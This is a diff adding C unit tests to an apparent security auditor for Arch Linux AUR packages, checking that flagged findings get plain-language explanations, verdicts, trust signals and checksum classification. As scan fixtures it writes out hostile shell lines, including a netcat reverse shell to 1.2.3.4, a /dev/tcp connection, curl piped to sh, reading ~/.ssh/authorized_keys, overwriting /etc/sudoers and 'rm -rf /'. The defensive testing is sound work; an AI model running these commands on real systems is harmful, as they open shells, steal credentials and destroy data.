@@ -210,3 +210,130 @@ void run_audit_calibration_tests(void)
            == SEV_WARN, "udev RUN is WARN");
     printf("audit calibration: ok\n");
 }
+
+void run_audit_plain_tests(void);
+
+/* every finding the evil samples produce has a plain-language explanation */
+static void all_explained(const char *name, const char *text)
+{
+    Report r;
+    report_init(&r);
+    audit_scan_text(&r, name, text, strlen(text));
+    ASSERT(r.n > 0, "sample produces findings");
+    for (size_t i = 0; i < r.n; i++) {
+        if (audit_explain(r.f[i].msg) == NULL)
+            fprintf(stderr, "no explanation for: %s\n", r.f[i].msg);
+        ASSERT(audit_explain(r.f[i].msg) != NULL, "finding has a plain explanation");
+    }
+    report_free(&r);
+}
+
+void run_audit_plain_tests(void)
+{
+    all_explained("PKGBUILD",
+                  "curl -s https://x.example/a | sh\n"
+                  "echo aGk= | base64 -d | bash\n"
+                  "exec 3<>/dev/tcp/1.2.3.4/80\n"
+                  "nc -e /bin/sh 1.2.3.4 9\n"
+                  "mkfifo /tmp/f\n"
+                  "eval \"$x\"\n"
+                  "python -c 'print(1)'\n"
+                  "sudo make install\n"
+                  "systemctl enable foo\n"
+                  "chmod 4755 \"$pkgdir/usr/bin/x\"\n"
+                  "chmod 777 x\n"
+                  "setcap cap_net_raw+ep x\n"
+                  "echo x >> ~/.bashrc\n"
+                  "crontab -l\n"
+                  "cp x ~/.config/autostart/\n"
+                  "LD_PRELOAD=/x.so foo\n"
+                  "modprobe foo\n"
+                  "useradd foo\n"
+                  "wget https://bit.ly/abc\n"
+                  "git clone https://example.org/x\n"
+                  "nohup foo\n"
+                  "iptables -F\n"
+                  "cat ~/.ssh/authorized_keys\n"
+                  "rm -rf /\n");
+    all_explained("foo.install", "post_install() { echo x > /etc/sudoers; }\n");
+
+    /* verdicts follow the highest severity */
+    Report r;
+    report_init(&r);
+    ASSERT(audit_verdict(&r) == VERDICT_OK, "no findings: ok");
+    report_add(&r, SEV_WARN, "PKGBUILD", 1, "detaches a background process", NULL);
+    ASSERT(audit_verdict(&r) == VERDICT_CAUTION, "warn: caution");
+    report_add(&r, SEV_CRIT, "PKGBUILD", 2, "download piped straight into a shell", NULL);
+    ASSERT(audit_verdict(&r) == VERDICT_BLOCK, "critical: block");
+    ASSERT(strlen(verdict_advice(VERDICT_BLOCK)) > 0, "advice text");
+    report_free(&r);
+
+    /* names inside a message never pick a wrong explanation */
+    report_init(&r);
+    audit_pkginfo_text(&r, "x", "pkgname = sudo\npkgbase = cronie-bin\n", "cronie-bin", "cronie-bin");
+    ASSERT(r.max == SEV_CRIT, "pkgname mismatch is critical");
+    ASSERT(strstr(audit_explain(r.f[0].msg), "different package") != NULL,
+           "mismatch explained as a different package");
+    report_free(&r);
+    report_init(&r);
+    audit_pkginfo_text(&r, "x", "# generated\npkgname = hello\npkgbase = hello\n", "hello", "hello");
+    ASSERT(r.n == 0, "matching .PKGINFO is fine");
+    audit_pkginfo_text(&r, "x", "pkgver = 1\n", "hello", "hello");
+    ASSERT(r.max == SEV_CRIT, "missing pkgname is critical");
+    report_free(&r);
+
+    /* AUR trust signals */
+    long now = 2000000000L;
+    AurMeta m = { true, 0, 0.0, now - 3 * 86400, now, 0, false };
+    report_init(&r);
+    audit_aur_meta(&r, &m, now);
+    ASSERT(r.max == SEV_WARN && strstr(r.f[0].msg, "new package") != NULL,
+           "brand-new package without votes is a warning");
+    report_free(&r);
+    AurMeta old = { true, 500, 9.5, now - 900L * 86400, now, 0, false };
+    report_init(&r);
+    audit_aur_meta(&r, &old, now);
+    ASSERT(r.n == 0, "established package: no signal");
+    old.orphan = true;
+    audit_aur_meta(&r, &old, now);
+    ASSERT(r.max == SEV_WARN, "orphan is a warning");
+    report_free(&r);
+    report_init(&r);
+    AurMeta unknown = { false, 0, 0.0, 0, 0, 0, false };
+    audit_aur_meta(&r, &unknown, now);
+    ASSERT(r.n == 0, "unknown metadata adds nothing");
+    report_free(&r);
+
+    /* how downloads are verified */
+    SourceStats st;
+    audit_source_stats(
+        "pkgbase = x\n"
+        "\tsource = https://e.org/a.tar.gz\n"
+        "\tsource = https://e.org/a.tar.gz.sig\n"
+        "\tsource = local.patch\n"
+        "\tsource = b::https://e.org/b.tar.gz\n"
+        "\tsource = git+https://e.org/c.git#commit=abc\n"
+        "\tsource = git+https://e.org/d.git\n"
+        "\tsha256sums = aa\n\tsha256sums = SKIP\n\tsha256sums = bb\n\tsha256sums = SKIP\n"
+        "\tsha256sums = SKIP\n\tsha256sums = SKIP\n"
+        "\tsource_x86_64 = https://e.org/e.bin\n"
+        "\tmd5sums_x86_64 = cc\n"
+        "pkgname = x\n", &st);
+    ASSERT(st.total == 7, "all sources counted");
+    ASSERT(st.remote == 3 && st.strong == 1 && st.weak == 1 && st.unchecked == 1,
+           "remote files classified by checksum");
+    ASSERT(st.signatures == 1 && st.vcs == 2 && st.vcs_pinned == 1, "signatures and VCS");
+
+    /* the plain printer groups duplicates and never crashes on empty input */
+    report_init(&r);
+    FILE *null = fopen("/dev/null", "w");
+    ASSERT(null != NULL, "open /dev/null");
+    report_print_plain(&r, null, false);
+    for (int i = 0; i < 20; i++)
+        report_add(&r, SEV_INFO, "f", i, "references a home directory", NULL);
+    report_add(&r, SEV_HIGH, "g", 1, "some message without explanation", NULL);
+    report_print_plain(&r, null, true);
+    fclose(null);
+    report_free(&r);
+    printf("audit plain language: ok\n");
+}
